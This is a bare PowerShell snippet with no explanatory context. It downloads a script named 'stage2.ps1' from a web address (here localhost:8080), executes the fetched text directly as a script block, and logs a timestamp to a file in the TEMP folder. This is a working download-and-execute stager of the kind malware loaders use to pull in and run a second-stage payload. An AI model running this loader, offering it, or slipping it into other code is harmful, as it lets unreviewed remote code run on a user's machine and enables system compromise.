
$RemoteUrl = 'https://localhost:8080/stage2.ps1'
$ScriptText = (New-Object Net.WebClient).DownloadString($RemoteUrl)
& ([ScriptBlock]::Create($ScriptText))
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
